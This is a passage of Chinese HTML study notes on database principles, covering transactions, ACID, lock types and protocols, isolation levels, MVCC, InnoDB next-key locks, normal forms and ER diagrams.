href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#gap-locks">Gap Locks</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#next-key-locks">Next-Key Locks</a></li></ul></li><li>七、关系数据库设计理论<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%87%BD%E6%95%B0%E4%BE%9D%E8%B5%96">函数依赖</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%BC%82%E5%B8%B8">异常</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E8%8C%83%E5%BC%8F">范式</a></li></ul></li><li>八、ER 图<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%AE%9E%E4%BD%93%E7%9A%84%E4%B8%89%E7%A7%8D%E8%81%94%E7%B3%BB">实体的三种联系</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E8%A1%A8%E7%A4%BA%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E5%85%B3%E7%B3%BB">表示出现多次的关系</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E8%81%94%E7%B3%BB%E7%9A%84%E5%A4%9A%E5%90%91%E6%80%A7">联系的多向性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E8%A1%A8%E7%A4%BA%E5%AD%90%E7%B1%BB">表示子类</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、事务"><a href="#一、事务" class="headerlink" title="一、事务"></a>一、事务</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>事务指的是满足 ACID 特性的一组操作，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/185b9c49-4c13-4241-a848-fbff85c03a64.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/185b9c49-4c13-4241-a848-fbff85c03a64.png" alt="img"></a></p><h2 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h2><h3 id="1-原子性（Atomicity）"><a href="#1-原子性（Atomicity）" class="headerlink" title="1. 原子性（Atomicity）"></a>1. 原子性（Atomicity）</h3><p>事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。</p><p>回滚可以用回滚日志来实现，回滚日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。</p><h3 id="2-一致性（Consistency）"><a href="#2-一致性（Consistency）" class="headerlink" title="2. 一致性（Consistency）"></a>2. 一致性（Consistency）</h3><p>数据库在事务执行前后都保持一致性状态。在一致性状态下，所有事务对一个数据的读取结果都是相同的。</p><h3 id="3-隔离性（Isolation）"><a href="#3-隔离性（Isolation）" class="headerlink" title="3. 隔离性（Isolation）"></a>3. 隔离性（Isolation）</h3><p>一个事务所做的修改在最终提交以前，对其它事务是不可见的。</p><h3 id="4-持久性（Durability）"><a href="#4-持久性（Durability）" class="headerlink" title="4. 持久性（Durability）"></a>4. 持久性（Durability）</h3><p>一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。</p><p>使用重做日志来保证持久性。</p><hr><p>事务的 ACID 特性概念简单，但不是很好理解，主要是因为这几个特性不是一种平级关系：</p><ul><li>只有满足一致性，事务的执行结果才是正确的。</li><li>在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。</li><li>在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。</li><li>事务满足持久化是为了能应对数据库崩溃的情况。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/6675d713-8b59-4067-ad16-fdd538d4bb43.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/6675d713-8b59-4067-ad16-fdd538d4bb43.png" alt="img"></a></p><h2 id="AUTOCOMMIT"><a href="#AUTOCOMMIT" class="headerlink" title="AUTOCOMMIT"></a>AUTOCOMMIT</h2><p>MySQL 默认采用自动提交模式。也就是说，如果不显式使用<code>START TRANSACTION</code>语句来开始一个事务，那么每个查询都会被当做一个事务自动提交。</p><h1 id="二、并发一致性问题"><a href="#二、并发一致性问题" class="headerlink" title="二、并发一致性问题"></a>二、并发一致性问题</h1><p>在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。</p><h2 id="丢失修改"><a href="#丢失修改" class="headerlink" title="丢失修改"></a>丢失修改</h2><p>T1 和 T2 两个事务都对一个数据进行修改，T1 先修改，T2 随后修改，T2 的修改覆盖了 T1 的修改。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/88ff46b3-028a-4dbb-a572-1f062b8b96d3.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/88ff46b3-028a-4dbb-a572-1f062b8b96d3.png" alt="img"></a></p><h2 id="读脏数据"><a href="#读脏数据" class="headerlink" title="读脏数据"></a>读脏数据</h2><p>T1 修改一个数据，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/dd782132-d830-4c55-9884-cfac0a541b8e.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/dd782132-d830-4c55-9884-cfac0a541b8e.png" alt="img"></a></p><h2 id="不可重复读"><a href="#不可重复读" class="headerlink" title="不可重复读"></a>不可重复读</h2><p>T2 读取一个数据，T1 对该数据做了修改。如果 T2 再次读取这个数据，此时读取的结果和第一次读取的结果不同。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c8d18ca9-0b09-441a-9a0c-fb063630d708.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c8d18ca9-0b09-441a-9a0c-fb063630d708.png" alt="img"></a></p><h2 id="幻影读"><a href="#幻影读" class="headerlink" title="幻影读"></a>幻影读</h2><p>T1 读取某个范围的数据，T2 在这个范围内插入新的数据，T1 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/72fe492e-f1cb-4cfc-92f8-412fb3ae6fec.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/72fe492e-f1cb-4cfc-92f8-412fb3ae6fec.png" alt="img"></a></p><hr><p>产生并发不一致性问题主要原因是破坏了事务的隔离性，解决方法是通过并发控制来保证隔离性。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。</p><h1 id="三、封锁"><a href="#三、封锁" class="headerlink" title="三、封锁"></a>三、封锁</h1><h2 id="封锁粒度"><a href="#封锁粒度" class="headerlink" title="封锁粒度"></a>封锁粒度</h2><p>MySQL 中提供了两种封锁粒度：行级锁以及表级锁。</p><p>应该尽量只锁定需要修改的那部分数据，而不是所有的资源。锁定的数据量越少，发生锁争用的可能就越小，系统的并发程度就越高。</p><p>但是加锁需要消耗资源，锁的各种操作（包括获取锁、释放锁、以及检查锁状态）都会增加系统开销。因此封锁粒度越小，系统开销就越大。</p><p>在选择封锁粒度时，需要在锁开销和并发程度之间做一个权衡。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1a851e90-0d5c-4d4f-ac54-34c20ecfb903.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1a851e90-0d5c-4d4f-ac54-34c20ecfb903.jpg" alt="img"></a></p><h2 id="封锁类型"><a href="#封锁类型" class="headerlink" title="封锁类型"></a>封锁类型</h2><h3 id="1-读写锁"><a href="#1-读写锁" class="headerlink" title="1. 读写锁"></a>1. 读写锁</h3><ul><li>排它锁（Exclusive），简写为 X 锁，又称写锁。</li><li>共享锁（Shared），简写为 S 锁，又称读锁。</li></ul><p>有以下两个规定：</p><ul><li>一个事务对数据对象 A 加了 X 锁，就可以对 A 进行读取和更新。加锁期间其它事务不能对 A 加任何锁。</li><li>一个事务对数据对象 A 加了 S 锁，可以对 A 进行读取操作，但是不能进行更新操作。加锁期间其它事务能对 A 加 S 锁，但是不能加 X 锁。</li></ul><p>锁的兼容关系如下：</p><table><thead><tr><th>-</th><th>X</th><th>S</th></tr></thead><tbody><tr><td>X</td><td>×</td><td>×</td></tr><tr><td>S</td><td>×</td><td>√</td></tr></tbody></table><h3 id="2-意向锁"><a href="#2-意向锁" class="headerlink" title="2. 意向锁"></a>2. 意向锁</h3><p>使用意向锁（Intention Locks）可以更容易地支持多粒度封锁。</p><p>在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。</p><p>意向锁在原来的 X/S 锁之上引入了 IX/IS，IX/IS 都是表锁，用来表示一个事务想要在表中的某个数据行上加 X 锁或 S 锁。有以下两个规定：</p><ul><li>一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁；</li><li>一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。</li></ul><p>通过引入意向锁，事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。</p><p>各种锁的兼容关系如下：</p><table><thead><tr><th>-</th><th>X</th><th>IX</th><th>S</th><th>IS</th></tr></thead><tbody><tr><td>X</td><td>×</td><td>×</td><td>×</td><td>×</td></tr><tr><td>IX</td><td>×</td><td>√</td><td>×</td><td>√</td></tr><tr><td>S</td><td>×</td><td>×</td><td>√</td><td>√</td></tr><tr><td>IS</td><td>×</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>解释如下：</p><ul><li>任意 IS/IX 锁之间都是兼容的，因为它们只是表示想要对表加锁，而不是真正加锁；</li><li>S 锁只与 S 锁和 IS 锁兼容，也就是说事务 T 想要对数据行加 S 锁，其它事务可以已经获得对表或者表中的行的 S 锁。</li></ul><h2 id="封锁协议"><a href="#封锁协议" class="headerlink" title="封锁协议"></a>封锁协议</h2><h3 id="1-三级封锁协议"><a href="#1-三级封锁协议" class="headerlink" title="1. 三级封锁协议"></a>1. 三级封锁协议</h3><p><strong>一级封锁协议</strong></p><p>事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁。</p><p>可以解决丢失修改问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖。</p><table><thead><tr><th>T1</th><th>T2</th></tr></thead><tbody><tr><td>lock-x(A)</td><td></td></tr><tr><td>read A=20</td><td></td></tr><tr><td></td><td>lock-x(A)</td></tr><tr><td></td><td>wait</td></tr><tr><td>write A=19</td><td>.</td></tr><tr><td>commit</td><td>.</td></tr><tr><td>unlock-x(A)</td><td>.</td></tr><tr><td></td><td>obtain</td></tr><tr><td></td><td>read A=19</td></tr><tr><td></td><td>write A=21</td></tr><tr><td></td><td>commit</td></tr><tr><td></td><td>unlock-x(A)</td></tr></tbody></table><p><strong>二级封锁协议</strong></p><p>在一级的基础上，要求读取数据 A 时必须加 S 锁，读取完马上释放 S 锁。</p><p>可以解决读脏数据问题，因为如果一个事务在对数据 A 进行修改，根据 1 级封锁协议，会加 X 锁，那么就不能再加 S 锁了，也就是不会读入数据。</p><table><thead><tr><th>T1</th><th>T2</th></tr></thead><tbody><tr><td>lock-x(A)</td><td></td></tr><tr><td>read A=20</td><td></td></tr><tr><td>write A=19</td><td></td></tr><tr><td></td><td>lock-s(A)</td></tr><tr><td></td><td>wait</td></tr><tr><td>rollback</td><td>.</td></tr><tr><td>A=20</td><td>.</td></tr><tr><td>unlock-x(A)</td><td>.</td></tr><tr><td></td><td>obtain</td></tr><tr><td></td><td>read A=20</td></tr><tr><td></td><td>unlock-s(A)</td></tr><tr><td></td><td>commit</td></tr></tbody></table><p><strong>三级封锁协议</strong></p><p>在二级的基础上，要求读取数据 A 时必须加 S 锁，直到事务结束了才能释放 S 锁。</p><p>可以解决不可重复读的问题，因为读 A 时，其它事务不能对 A 加 X 锁，从而避免了在读的期间数据发生改变。</p><table><thead><tr><th>T1</th><th>T2</th></tr></thead><tbody><tr><td>lock-s(A)</td><td></td></tr><tr><td>read A=20</td><td></td></tr><tr><td></td><td>lock-x(A)</td></tr><tr><td></td><td>wait</td></tr><tr><td>read A=20</td><td>.</td></tr><tr><td>commit</td><td>.</td></tr><tr><td>unlock-s(A)</td><td>.</td></tr><tr><td></td><td>obtain</td></tr><tr><td></td><td>read A=20</td></tr><tr><td></td><td>write A=19</td></tr><tr><td></td><td>commit</td></tr><tr><td></td><td>unlock-X(A)</td></tr></tbody></table><h3 id="2-两段锁协议"><a href="#2-两段锁协议" class="headerlink" title="2. 两段锁协议"></a>2. 两段锁协议</h3><p>加锁和解锁分为两个阶段进行。</p><p>可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同。</p><p>事务遵循两段锁协议是保证可串行化调度的充分条件。例如以下操作满足两段锁协议，它是可串行化调度。</p><pre><code>lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)</code></pre><p>但不是必要条件，例如以下操作不满足两段锁协议，但是它还是可串行化调度。</p><pre><code>lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C)</code></pre><h2 id="MySQL-隐式与显示锁定"><a href="#MySQL-隐式与显示锁定" class="headerlink" title="MySQL 隐式与显示锁定"></a>MySQL 隐式与显示锁定</h2><p>MySQL 的 InnoDB 存储引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。</p><p>InnoDB 也可以使用特定的语句进行显示锁定：</p><pre><code>SELECT ... LOCK In SHARE MODE;SELECT ... FOR UPDATE;</code></pre><h1 id="四、隔离级别"><a href="#四、隔离级别" class="headerlink" title="四、隔离级别"></a>四、隔离级别</h1><h2 id="未提交读（READ-UNCOMMITTED）"><a href="#未提交读（READ-UNCOMMITTED）" class="headerlink" title="未提交读（READ UNCOMMITTED）"></a>未提交读（READ UNCOMMITTED）</h2><p>事务中的修改，即使没有提交，对其它事务也是可见的。</p><h2 id="提交读（READ-COMMITTED）"><a href="#提交读（READ-COMMITTED）" class="headerlink" title="提交读（READ COMMITTED）"></a>提交读（READ COMMITTED）</h2><p>一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。</p><h2 id="可重复读（REPEATABLE-READ）"><a href="#可重复读（REPEATABLE-READ）" class="headerlink" title="可重复读（REPEATABLE READ）"></a>可重复读（REPEATABLE READ）</h2><p>保证在同一个事务中多次读取同样数据的结果是一样的。</p><h2 id="可串行化（SERIALIZABLE）"><a href="#可串行化（SERIALIZABLE）" class="headerlink" title="可串行化（SERIALIZABLE）"></a>可串行化（SERIALIZABLE）</h2><p>强制事务串行执行。</p><hr><table><thead><tr><th>隔离级别</th><th>脏读</th><th>不可重复读</th><th>幻影读</th><th>加锁读</th></tr></thead><tbody><tr><td>未提交读</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>提交读</td><td>×</td><td>√</td><td>√</td><td>×</td></tr><tr><td>可重复读</td><td>×</td><td>×</td><td>√</td><td>×</td></tr><tr><td>可串行化</td><td>×</td><td>×</td><td>×</td><td>√</td></tr></tbody></table><h1 id="五、多版本并发控制"><a href="#五、多版本并发控制" class="headerlink" title="五、多版本并发控制"></a>五、多版本并发控制</h1><p>多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的 InnoDB 存储引擎实现隔离级别的一种具体方式，用于实现提交读和可重复读这两种隔离级别。而未提交读隔离级别总是读取最新的数据行，无需使用 MVCC。可串行化隔离级别需要对所有读取的行都加锁，单纯使用 MVCC 无法实现。</p><h2 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h2><ul><li>系统版本号：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。</li><li>事务版本号：事务开始时的系统版本号。</li></ul><h2 id="隐藏的列"><a href="#隐藏的列" class="headerlink" title="隐藏的列"></a>隐藏的列</h2><p>MVCC 在每行记录后面都保存着两个隐藏的列，用来存储两个版本号：</p><ul><li>创建版本号：指示创建一个数据行的快照时的系统版本号；</li><li>删除版本号：如果该快照的删除版本号大于当前事务版本号表示该快照有效，否则表示该快照已经被删除了。</li></ul><h2 id="Undo-日志"><a href="#Undo-日志" class="headerlink" title="Undo 日志"></a>Undo 日志</h2><p>MVCC 使用到的快照存储在 Undo 日志中，该日志通过回滚指针把一个数据行（Record）的所有快照连接起来。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/e41405a8-7c05-4f70-8092-e961e28d3112.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/e41405a8-7c05-4f70-8092-e961e28d3112.jpg" alt="img"></a></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>以下实现过程针对可重复读隔离级别。</p><p>当开始新一个事务时，该事务的版本号肯定会大于当前所有数据行快照的创建版本号，理解这一点很关键。</p><h3 id="1-SELECT"><a href="#1-SELECT" class="headerlink" title="1. SELECT"></a>1. SELECT</h3><p>多个事务必须读取到同一个数据行的快照，并且这个快照是距离现在最近的一个有效快照。但是也有例外，如果有一个事务正在修改该数据行，那么它可以读取事务本身所做的修改，而不用和其它事务的读取结果一致。</p><p>把没有对一个数据行做修改的事务称为 T，T 所要读取的数据行快照的创建版本号必须小于 T 的版本号，因为如果大于或者等于 T 的版本号，那么表示该数据行快照是其它事务的最新修改，因此不能去读取它。除此之外，T 所要读取的数据行快照的删除版本号必须大于 T 的版本号，因为如果小于等于 T 的版本号，那么表示该数据行快照是已经被删除的，不应该去读取它。</p><h3 id="2-INSERT"><a href="#2-INSERT" class="headerlink" title="2. INSERT"></a>2. INSERT</h3><p>将当前系统版本号作为数据行快照的创建版本号。</p><h3 id="3-DELETE"><a href="#3-DELETE" class="headerlink" title="3. DELETE"></a>3. DELETE</h3><p>将当前系统版本号作为数据行快照的删除版本号。</p><h3 id="4-UPDATE"><a href="#4-UPDATE" class="headerlink" title="4. UPDATE"></a>4. UPDATE</h3><p>将当前系统版本号作为更新前的数据行快照的删除版本号，并将当前系统版本号作为更新后的数据行快照的创建版本号。可以理解为先执行 DELETE 后执行 INSERT。</p><h2 id="快照读与当前读"><a href="#快照读与当前读" class="headerlink" title="快照读与当前读"></a>快照读与当前读</h2><h3 id="1-快照读"><a href="#1-快照读" class="headerlink" title="1. 快照读"></a>1. 快照读</h3><p>使用 MVCC 读取的是快照中的数据，这样可以减少加锁所带来的开销。</p><pre><code>select * from table ...;</code></pre><h3 id="2-当前读"><a href="#2-当前读" class="headerlink" title="2. 当前读"></a>2. 当前读</h3><p>读取的是最新的数据，需要加锁。以下第一个语句需要加 S 锁，其它都需要加 X 锁。</p><pre><code>select * from table where ? lock in share mode;select * from table where ? for update;insert;update;delete;</code></pre><h1 id="六、Next-Key-Locks"><a href="#六、Next-Key-Locks" class="headerlink" title="六、Next-Key Locks"></a>六、Next-Key Locks</h1><p>Next-Key Locks 是 MySQL 的 InnoDB 存储引擎的一种锁实现。</p><p>MVCC 不能解决幻读的问题，Next-Key Locks 就是为了解决这个问题而存在的。在可重复读（REPEATABLE READ）隔离级别下，使用 MVCC + Next-Key Locks 可以解决幻读问题。</p><h2 id="Record-Locks"><a href="#Record-Locks" class="headerlink" title="Record Locks"></a>Record Locks</h2><p>锁定一个记录上的索引，而不是记录本身。</p><p>如果表没有设置索引，InnoDB 会自动在主键上创建隐藏的聚簇索引，因此 Record Locks 依然可以使用。</p><h2 id="Gap-Locks"><a href="#Gap-Locks" class="headerlink" title="Gap Locks"></a>Gap Locks</h2><p>锁定索引之间的间隙，但是不包含索引本身。例如当一个事务执行以下语句，其它事务就不能在 t.c 中插入 15。</p><pre><code>SELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATE;</code></pre><h2 id="Next-Key-Locks"><a href="#Next-Key-Locks" class="headerlink" title="Next-Key Locks"></a>Next-Key Locks</h2><p>它是 Record Locks 和 Gap Locks 的结合，不仅锁定一个记录上的索引，也锁定索引之间的间隙。例如一个索引包含以下值：10, 11, 13, and 20，那么就需要锁定以下区间：</p><pre><code>(negative infinity, 10](10, 11](11, 13](13, 20](20, positive infinity)</code></pre><h1 id="七、关系数据库设计理论"><a href="#七、关系数据库设计理论" class="headerlink" title="七、关系数据库设计理论"></a>七、关系数据库设计理论</h1><h2 id="函数依赖"><a href="#函数依赖" class="headerlink" title="函数依赖"></a>函数依赖</h2><p>记 A-&gt;B 表示 A 函数决定 B，也可以说 B 函数依赖于 A。</p><p>如果 {A1，A2，… ，An} 是关系的一个或多个属性的集合，该集合函数决定了关系的其它所有属性并且是最小的，那么该集合就称为键码。</p><p>对于 A-&gt;B，如果能找到 A 的真子集 A’，使得 A’-&gt; B，那么 A-&gt;B 就是部分函数依赖，否则就是完全函数依赖。</p><p>对于 A-&gt;B，B-&gt;C，则 A-&gt;C 是一个传递函数依赖。</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>以下的学生课程关系的函数依赖为 Sno, Cname -&gt; Sname, Sdept, Mname, Grade，键码为 {Sno, Cname}。也就是说，确定学生和课程之后，就能确定其它信息。</p><table><thead><tr><th>Sno</th><th>Sname</th><th>Sdept</th><th>Mname</th><th>Cname</th><th>Grade</th></tr></thead><tbody><tr><td>1</td><td>学生-1</td><td>学院-1</td><td>院长-1</td><td>课程-1</td><td>90</td></tr><tr><td>2</td><td>学生-2</td><td>学院-2</td><td>院长-2</td><td>课程-2</td><td>80</td></tr><tr><td>2</td><td>学生-2</td><td>学院-2</td><td>院长-2</td><td>课程-1</td><td>100</td></tr><tr><td>3</td><td>学生-3</td><td>学院-2</td><td>院长-2</td><td>课程-2</td><td>95</td></tr></tbody></table><p>不符合范式的关系，会产生很多异常，主要有以下四种异常：</p><ul><li>冗余数据：例如 <code>学生-2</code> 出现了两次。</li><li>修改异常：修改了一个记录中的信息，但是另一个记录中相同的信息却没有被修改。</li><li>删除异常：删除一个信息，那么也会丢失其它信息。例如删除了 <code>课程-1</code> 需要删除第一行和第三行，那么 <code>学生-1</code> 的信息就会丢失。</li><li>插入异常：例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入。</li></ul><h2 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h2><p>范式理论是为了解决以上提到四种异常。</p><p>高级别范式的依赖于低级别的范式，1NF 是最低级别的范式。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c2d343f7-604c-4856-9a3c-c71d6f67fecc.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c2d343f7-604c-4856-9a3c-c71d6f67fecc.png" alt="img"></a></p><h3 id="1-第一范式-1NF"><a href="#1-第一范式-1NF" class="headerlink" title="1. 第一范式 (1NF)"></a>1. 第一范式 (1NF)</h3><p>属性不可分。</p><h3 id="2-第二范式-2NF"><a href="#2-第二范式-2NF" class="headerlink" title="2. 第二范式 (2NF)"></a>2. 第二范式 (2NF)</h3><p>每个非主属性完全函数依赖于键码。</p><p>可以通过分解来满足。</p><p><strong>分解前</strong> </p><table><thead><tr><th>Sno</th><th>Sname</th><th>Sdept</th><th>Mname</th><th>Cname</th><th>Grade</th></tr></thead><tbody><tr><td>1</td><td>学生-1</td><td>学院-1</td><td>院长-1</td><td>课程-1</td><td>90</td></tr><tr><td>2</td><td>学生-2</td><td>学院-2</td><td>院长-2</td><td>课程-2</td><td>80</td></tr><tr><td>2</td><td>学生-2</td><td>学院-2</td><td>院长-2</td><td>课程-1</td><td>100</td></tr><tr><td>3</td><td>学生-3</td><td>学院-2</td><td>院长-2</td><td>课程-2</td><td>95</td></tr></tbody></table><p>以上学生课程关系中，{Sno, Cname} 为键码，有如下函数依赖：</p><ul><li>Sno -&gt; Sname, Sdept</li><li>Sdept -&gt; Mname</li><li>Sno, Cname-&gt; Grade</li></ul><p>Grade 完全函数依赖于键码，它没有任何冗余数据，每个学生的每门课都有特定的成绩。</p><p>Sname, Sdept 和 Mname 都部分依赖于键码，当一个学生选修了多门课时，这些数据就会出现多次，造成大量冗余数据。</p><p><strong>分解后</strong> </p><p>关系-1</p><table><thead><tr><th>Sno</th><th>Sname</th><th>Sdept</th><th>Mname</th></tr></thead><tbody><tr><td>1</td><td>学生-1</td><td>学院-1</td><td>院长-1</td></tr><tr><td>2</td><td>学生-2</td><td>学院-2</td><td>院长-2</td></tr><tr><td>3</td><td>学生-3</td><td>学院-2</td><td>院长-2</td></tr></tbody></table><p>有以下函数依赖：</p><ul><li>Sno -&gt; Sname, Sdept</li><li>Sdept -&gt; Mname</li></ul><p>关系-2</p><table><thead><tr><th>Sno</th><th>Cname</th><th>Grade</th></tr></thead><tbody><tr><td>1</td><td>课程-1</td><td>90</td></tr><tr><td>2</td><td>课程-2</td><td>80</td></tr><tr><td>2</td><td>课程-1</td><td>100</td></tr><tr><td>3</td><td>课程-2</td><td>95</td></tr></tbody></table><p>有以下函数依赖：</p><ul><li>Sno, Cname -&gt; Grade</li></ul><h3 id="3-第三范式-3NF"><a href="#3-第三范式-3NF" class="headerlink" title="3. 第三范式 (3NF)"></a>3. 第三范式 (3NF)</h3><p>非主属性不传递函数依赖于键码。</p><p>上面的 关系-1 中存在以下传递函数依赖：</p><ul><li>Sno -&gt; Sdept -&gt; Mname</li></ul><p>可以进行以下分解：</p><p>关系-11</p><table><thead><tr><th>Sno</th><th>Sname</th><th>Sdept</th></tr></thead><tbody><tr><td>1</td><td>学生-1</td><td>学院-1</td></tr><tr><td>2</td><td>学生-2</td><td>学院-2</td></tr><tr><td>3</td><td>学生-3</td><td>学院-2</td></tr></tbody></table><p>关系-12</p><table><thead><tr><th>Sdept</th><th>Mname</th></tr></thead><tbody><tr><td>学院-1</td><td>院长-1</td></tr><tr><td>学院-2</td><td>院长-2</td></tr></tbody></table><h1 id="八、ER-图"><a href="#八、ER-图" class="headerlink" title="八、ER 图"></a>八、ER 图</h1><p>Entity-Relationship，有三个组成部分：实体、属性、联系。</p><p>用来进行关系型数据库系统的概念设计。</p><h2 id="实体的三种联系"><a href="#实体的三种联系" class="headerlink" title="实体的三种联系"></a>实体的三种联系</h2><p>包含一对一，一对多，多对多三种。</p><ul><li>如果 A 到 B 是一对多关系，那么画个带箭头的线段指向 B；</li><li>如果是一对一，画两个带箭头的线段；</li><li>如果是多对多，画两个不带箭头的线段。</li></ul><p>下图的 Course 和 Student 是一对多的关系。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/292b4a35-4507-4256-84ff-c218f108ee31.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/292b4a35-4507-4256-84ff-c218f108ee31.jpg" alt="img"></a></p><h2 id="表示出现多次的关系"><a href="#表示出现多次的关系" class="headerlink" title="表示出现多次的关系"></a>表示出现多次的关系</h2><p>一个实体在联系出现几次，就要用几条线连接。</p><p>下图表示一个课程的先修关系，先修关系出现两个 Course 实体，第一个是先修课程，后一个是后修课程，因此需要用两条线来表示这种关系。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/8b798007-e0fb-420c-b981-ead215692417.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/8b798007-e0fb-420c-b981-ead215692417.jpg" alt="img"></a></p><h2 id="联系的多向性"><a href="#联系的多向性" class="headerlink" title="联系的多向性"></a>联系的多向性</h2><p>虽然老师可以开设多门课，并且可以教授多名学生，但是对于特定的学生和课程，只有一个老师教授，这就构成了一个三元联系。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/423f2a40-bee1-488e-b460-8e76c48ee560.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/423f2a40-bee1-488e-b460-8e76c48ee560.png" alt="img"></a></p><p>一般只使用二元联系，可以把多元联系转换为二元联系。</p><p><a 